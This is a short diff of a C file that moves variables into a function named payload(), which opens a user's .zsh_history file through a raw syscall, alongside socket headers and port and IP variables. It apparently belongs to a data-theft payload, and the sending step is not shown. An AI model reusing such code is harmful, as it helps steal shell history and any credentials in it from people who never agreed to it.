@@ -14,13 +14,13 @@
 #include <sys/socket.h>
 #include <sys/uio.h>
 
-uint16_t port = 0;
-uint32_t addr_ip = 0;
-// char path[PATH_MAX] = "/home/maxence/.zsh_history";
-char path[PATH_MAX] = "/home/maxence/.zsh_history";
-
 void payload(void)
 {
+	uint16_t port = 0;
+	uint32_t addr_ip = 0;
+	// char path[PATH_MAX] = "/home/maxence/.zsh_history";
+	char path[PATH_MAX] = "/home/maxence/.zsh_history";
+
 	int fd = syscall(SYS_open, path, O_RDONLY);
 	if (fd == -1) {
 		perror("open");
